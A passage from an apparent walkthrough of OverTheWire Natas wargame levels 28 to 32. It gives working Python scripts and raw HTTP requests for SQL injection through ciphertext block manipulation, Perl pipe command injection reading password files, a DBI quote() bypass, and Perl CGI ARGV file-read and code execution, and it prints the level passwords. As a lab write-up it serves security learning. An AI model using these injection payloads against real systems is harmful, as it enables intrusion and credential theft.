    my_part = res[len(prefix) + len(inner_block):]
    query = prefix + inner_block + my_part + suffix
    url_encoded = urllib.parse.quote_plus(query)
    print(url_encoded)
```

The suffix (URL-encoded) to append to `query=` in the URL: 
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b%2BKc4pf%2B0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI%3D
```

An analysis of the blocks (with added spaces):
```
Full normal query:    G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
Prefix:               G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP
Inner block:                                                    ItlMM3qTizkRB5P2zYxJsb
Suffix:                                                                               c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
Full malicious query: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIWJ2pwLjKxd0ddiQ3a1c5lWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K
Malicious block:                                                                      WY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+K

New malicious query (not URL-encoded):
G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsbWY4bHaEWFEfgtXy4iixC3kHAmMS6zcXtk1dWTlEF3X5k0NzIaCU2kq38vTeW0b+Kc4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI=
```

From the page, we get:

> Whack Computer Joke Database
>
> Q: How do you tell an introverted computer scientist from an extroverted computer scientist?
>    A: An extroverted computer scientist looks at your shoes when he talks to you.
>
>    Q: Why do programmers always mix up Halloween and Christmas?
>    A: Because Oct 31 == Dec 25!
>
>    There are 10 kinds of people in the world: Those that know binary & those that don't
>
>    Two bytes meet. The first byte asks, "Are you ill?"
>    The second byte replies, "No, just feeling a bit off."
>
>    Q: how many programmers does it take to change a light bulb?
>    A: none, that's a hardware problem.
>    There are no shortcuts in life, unless you right click and find one...
>    Keyboard not found ... press F1 to continue
>    "Knock, knock.""Who's there?"
>    very long pause...
>    "Java."
>
>    A physicist, an engineer and a programmer were in a car driving over a steep alpine pass when the brakes failed. The car was getting faster and faster, they were struggling to get round the corners and once or twice only the feeble crash barrier saved them from crashing down the side of the mountain. They were sure they were all going to die, when suddenly they spotted an escape lane. They pulled into the escape lane, and came safely to a halt.
>    The physicist said "We need to model the friction in the brake pads and the resultant temperature rise, see if we can work out why they failed".
>    The engineer said "I think I've got a few spanners in the back. I'll take a look and see if I can work out what's wrong".
>    The programmer said "Why don't we get going again and see if it's reproducible?"
>
>    Q: Whats the object-oriented way to become wealthy?
>    A: Inheritance
>
>    Old C programmers don't die, they're just cast into void.
>
>    A SQL query goes into a bar, walks up to two tables and asks, "Can I join you?"
>
>    When your hammer is C++, everything begins to look like a thumb.
>
>    When we write programs that "learn", it turns out we do and they don't.
>
>    I've got a really good UDP joke to tell you, but I don't know if you'll get it
>
>    Q: What is a computer virus?
>    A: A terminal illness!
>
>    Recursion: Definition of recursion, see recursion.
>
>    A bright young coder named Lee
>    Wished to loop while i was 3
>    But when writing the =
>    He forgot its sequel
>    And thus looped infinitely
>
>    A computer lets you make more mistakes faster than any invention in human history - with the possible exceptions of handguns and tequila.
>
>    If it weren't for C, we'd all be programming in BASI and OBOL.
>
>    Two strings walk into a bar and sit down. The bartender says, "So what'll it be?"
>    The first string says, "I think I'll have a beer quag fulk boorg jdk`^Xbasdh dsa 23^@!8
>    "Please excuse my friend," the second string says. "He isn't null-terminated."
>
>    Q: Why does Python live on land?
>    A: Because it is above C level!

This principle allows us to inject the query (with final space!):
```
"AAAAAAAAA' UNION SELECT table_name FROM information_schema.tables; -- "
```

This tells us the tables, between which there is the table `users`.

Now we try the query:
```
"AAAAAAAAA' UNION SELECT ALL password FROM users; -- "
```

This gives some problems, so we try to Base64-decode and then re-encode:
```python
import requests
import urllib
import string
import os
import base64

from utils import utils


basic_auth = ('natas28', '1JNwQM1Oi6J6j1k49Xyw7ZN6pXMQInVj')

url = "http://natas28.natas.labs.overthewire.org/index.php"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

def send_request(session, query) -> str:
    body = {"query": query}
    response = session.post(url,
                    headers=headers,
                    data=body)
    result = response.url.split("=")[1]
    return urllib.parse.unquote(result)

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    inner_block_query = "          "
    res_inner_block = send_request(session, inner_block_query)
    inner_block = res_inner_block[len(prefix):len(res_inner_block) - len(suffix)]
    query = "AAAAAAAAA' UNION SELECT ALL password FROM users; -- " # The final space is necessary!
    res = send_request(session, query)
    my_part = res[len(prefix) + len(inner_block):]
    query = prefix + inner_block + my_part + suffix
    decoded = base64.b64decode(query)
    re_encoded = base64.b64encode(decoded)
    url_encoded = urllib.parse.quote_plus(re_encoded)
    print(url_encoded)
```

The result is:
```
G%2BglEae6W%2F1XjA7vRm21nNyEco%2Fc%2BJ2TdR0Qp8dcjPItlMM3qTizkRB5P2zYxJsb%2B76GKJOY6adng39QUMPprGe5X2vrsM8BRZAxT9Bt8cmSBdGBYutGkE7dxkKLuB1QrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ%2FOns%3D
```

Which, inserted after `query=` in the URL, gives us:

> 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

Therefore: `natas29:31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns`.


## Natas 29

### Credentials

Username: natas29

Password: 31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns

URL: http://natas29.natas.labs.overthewire.org

### Message

> H3y K1dZ,
> 
> y0 rEm3mB3rz p3Rl rit3?
> 
> \/\/4Nn4 g0 olD5kewL? R3aD Up!
> 
> c4n Y0 h4z s4uc3?

There is a **Perl underground** section.

### Solution

Selecting `perl underground` in the **Perl underground** area results in a call to:
```
http://natas29.natas.labs.overthewire.org/index.pl?file=perl+underground
```

We can inject commands that must be terminated by `%00`:
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```

We try to read `index.pl`:
```
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00
```

Using the script:
```python
import requests
import urllib
import string
import os
import base64

from utils import utils


basic_auth = ('natas29', '31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns')

url = "http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20index.pl%00"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

letters = string.ascii_letters

prefix = "G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjP"
suffix = "c4pf+0pFACRndRda5Za71vNN8znGntzhH2ZQu87WJwI="

def send_request(session) -> str:
    response = session.get(url,
                    headers=headers)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    res = send_request(session)
    print(res)
```
we print the HTML response, which contains Perl code:
```perl
#!/usr/bin/perl
use CGI qw(:standard);

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas29", "pass": "31F4j3Qi2PnuhIZQokxXk1L3QT9Cppns" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<style>

#content {
    width: 1000px;
}
pre{
    background-color: #000000;
    color: #00FF00;
}

</style>

<h1>natas29</h1>
<div id="content">
END
#
# morla /10111
# '$_=qw/ljttft3dvu{/,s/./print chr ord($&)-1/eg'
#
# credits for the previous level go to whoever
# created insomnihack2016/fridginator, where i stole the idea from.
# that was a fun challenge, Thanks!
#

print <<END;
H3y K1dZ,<br>
y0 rEm3mB3rz p3Rl rit3?<br>
\\/\\/4Nn4 g0 olD5kewL? R3aD Up!<br><br>

<form action="index.pl" method="GET">
<select name="file" onchange="this.form.submit()">
  <option value="">s3lEcT suMp1n!</option>
  <option value="perl underground">perl underground</option>
  <option value="perl underground 2">perl underground 2</option>
  <option value="perl underground 3">perl underground 3</option>
  <option value="perl underground 4">perl underground 4</option>
  <option value="perl underground 5">perl underground 5</option>
</select>
</form>

END

if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}

print <<END;
```

Interesting check on the file:
```perl
if(param('file')){
    $f=param('file');
    if($f=~/natas/){
        print "meeeeeep!<br>";
    }
    else{
        open(FD, "$f.txt");
        print "<pre>";
        while (<FD>){
            print CGI::escapeHTML($_);
        }
        print "</pre>";
    }
}
```

How can we bypass it?

We try with `|ls%00`: 
```bash
http://natas29.natas.labs.overthewire.org/index.pl?file=|ls%00
```
gives:
```
index.pl perl underground 2.txt perl underground 3.txt perl underground 4.txt perl underground 5.txt perl underground.txt
```

Try with:
```bash
https://natas29.natas.labs.overthewire.org/index.pl?file=/etc/natas_webpass/natas30
```
This gives:
```
meeeeeep!
```
as expected.

But:
```bash
http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20/etc/n?tas_webpass/n?tas30%20%00
```
works:
```
WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH
```

## Natas 30

### Credentials

Username: natas30

Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

URL: http://natas30.natas.labs.overthewire.org

### Message

Asks for a username and a password to login. 

Gives the source code.

### Solution

Let's get the source code:
```html
/var/www/natas/natas30/index-source.pl

#!/usr/bin/perl
use CGI qw(:standard);
use DBI;

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "<censored>" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
END

if ('POST' eq request_method && param('username') && param('password')){
    my $dbh = DBI->connect( "DBI:mysql:natas30","natas30", "<censored>", {'RaiseError' => 1});
    my $query="Select * FROM users where username =".$dbh->quote(param('username')) . " and password =".$dbh->quote(param('password')); 

    my $sth = $dbh->prepare($query);
    $sth->execute();
    my $ver = $sth->fetch();
    if ($ver){
        print "win!<br>";
        print "here is your result:<br>";
        print @$ver;
    }
    else{
        print "fail :(";
    }
    $sth->finish();
    $dbh->disconnect();
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

It seems vulnerable to SQL injection.

Prepare the Python script:
```python
import requests
import urllib
import string
import os
import base64

from utils import utils

basic_auth = ('natas30', 'WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH')

url = "http://natas30.natas.labs.overthewire.org/"
headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_request(session) -> str:
    params = {"username": "natas28", "password": ["'asd' or 1=1--", 4]}
    response = session.post(url,
                    headers=headers,
                    data=params,
                    verify=False)
    return response.text

if __name__ == '__main__':
    session = requests.Session()
    session.auth = basic_auth
    res = send_request(session)
    print(res)
```

and run it: we get:
```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas30", "pass": "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">

<!-- morla/10111 <3  happy birthday OverTheWire! <3  -->

<h1>natas30</h1>
<div id="content">

<form action="index.pl" method="POST">
Username: <input name="username"><br>
Password: <input name="password" type="password"><br>
<input type="submit" value="login" />
</form>
win!<br>here is your result:<br>natas31m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Thus: `natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y`.

## Natas 31


### Credentials

Username: natas31

Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y

URL: http://natas31.natas.labs.overthewire.org

### Message

CSV2HTML

We all like .csv files.
But isn't a nicely rendered and sortable table much cooler?

Select file to upload: ...

Gives the source code.

### Solution

Get the source code:
```html
/var/www/natas/natas31/index-source.pl

#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

We have a [Perl Jam](https://media.ccc.de/v/31c3_-_6243_-_en_-_saal_1_-_201412292200_-_the_perl_jam_exploiting_a_20_year-old_vulnerability_-_netanel_rubin) vulnerability. [Here](https://metacpan.org/pod/CGI#Processing-a-file-upload-field) more info.

Intercept the requests with Burp and modify an upload request to:
```
POST /index.pl?/etc/natas_webpass/natas32 HTTP/1.1
Host: natas31.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------31137614001250737213376075027
Content-Length: 547
Origin: http://natas31.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==
Connection: keep-alive
Referer: http://natas31.natas.labs.overthewire.org/index.pl
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------31137614001250737213376075027
Content-Disposition: form-data; name="file"

ARGV
-----------------------------31137614001250737213376075027
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

title,content
the test,this is a test
greetings,hello there
the world,the world is big and beautiful

-----------------------------31137614001250737213376075027
Content-Disposition: form-data; name="submit"

Upload
-----------------------------31137614001250737213376075027--
```

This gives us the response:
```
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 14:15:06 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1649
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- morla/10111 -->
<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas31</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Thus: `natas32:NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`.

## Natas 32

### Credentials

Username: natas32

Password: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B

URL: http://natas32.natas.labs.overthewire.org

### Message

CSV2HTML

We all like .csv files.
But isn't a nicely rendered and sortable table much cooler?

This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.

Select file to upload: ...

Gives the source code.

### Solution

The source code:
```html
/var/www/natas/natas32/index-source.pl

#!/usr/bin/perl
use CGI;
$ENV{'TMPDIR'}="/var/www/natas/natas32/tmp/";

print <<END;
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
END

my $cgi = CGI->new;
if ($cgi->upload('file')) {
    my $file = $cgi->param('file');
    print '<table class="sortable table table-hover table-striped">';
    $i=0;
    while (<$file>) {
        my @elements=split /,/, $_;

        if($i==0){ # header
            print "<tr>";
            foreach(@elements){
                print "<th>".$cgi->escapeHTML($_)."</th>";   
            }
            print "</tr>";
        }
        else{ # table content
            print "<tr>";
            foreach(@elements){
                print "<td>".$cgi->escapeHTML($_)."</td>";   
            }
            print "</tr>";
        }
        $i+=1;
    }
    print '</table>';
}
else{
print <<END;

<form action="index.pl" method="post" enctype="multipart/form-data">
    <h2> CSV2HTML</h2>
    <br>
    We all like .csv files.<br>
    But isn't a nicely rendered and sortable table much cooler?<br>
    <br>
    This time you need to prove that you got code exec. There is a binary in the webroot that you need to execute.
    <br><br>
    Select file to upload:
    <span class="btn btn-default btn-file">
        Browse <input type="file" name="file">
    </span>    
    <input type="submit" value="Upload" name="submit" class="btn">
</form> 
END
}

print <<END;
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
END
```

We need code execution. Try with the same and modify a bit the query parameter:
```
POST /index.pl?ls%20.%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------6745997931446806743306091397
Content-Length: 543
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/index.pl
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="file"

ARGV
-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

title,content
the test,this is a test
greetings,hello there
the world,the world is big and beautiful

-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="submit"

Upload
-----------------------------6745997931446806743306091397--
```

This gives:
```
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 14:40:08 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1882
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>.:
</th></tr><tr><td>bootstrap-3.3.6-dist
</td></tr><tr><td>getpassword
</td></tr><tr><td>index-source.html
</td></tr><tr><td>index.pl
</td></tr><tr><td>jquery-1.12.3.min.js
</td></tr><tr><td>sorttable.js
</td></tr><tr><td>tmp
</td></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Ok, let's try to get the password. There is a `getpassword` file... Maybe that... After a few attempts:
```
POST /index.pl?./getpassword%20| HTTP/1.1
Host: natas32.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------6745997931446806743306091397
Content-Length: 543
Origin: http://natas32.natas.labs.overthewire.org
Authorization: Basic bmF0YXMzMjpOYUlXaFcyVklyS3FyYzdhcm9KVkhPWnZrM1JRTWkwQg==
Connection: keep-alive
Referer: http://natas32.natas.labs.overthewire.org/index.pl
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Priority: u=0, i

-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="file"

ARGV
-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="file"; filename="test.csv"
Content-Type: text/csv

title,content
the test,this is a test
greetings,hello there
the world,the world is big and beautiful

-----------------------------6745997931446806743306091397
Content-Disposition: form-data; name="submit"

Upload
-----------------------------6745997931446806743306091397--
```
gives us:
```
HTTP/1.1 200 OK
Date: Sat, 04 Jan 2025 14:47:27 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1688
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
<head>
<!-- This stuff in the header has nothing to do with the level -->
<!-- Bootstrap -->
<link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas32", "pass": "<censored>" };</script>
<script src="sorttable.js"></script>
</head>
<script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>

<!-- 
    morla/10111 
    shouts to Netanel Rubin    
-->

<style>
#content {
    width: 900px;
}
.btn-file {
    position: relative;
    overflow: hidden;
}
.btn-file input[type=file] {
    position: absolute;
    top: 0;
    right: 0;
    min-width: 100%;
    min-height: 100%;
    font-size: 100px;
    text-align: right;
    filter: alpha(opacity=0);
    opacity: 0;
    outline: none;
    background: white;
    cursor: inherit;
    display: block;
}

</style>


<h1>natas32</h1>
<div id="content">
<table class="sortable table table-hover table-striped"><tr><th>2v9nDlbSF7jvawaCncr5Z9kSzkmBeoCJ
</th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

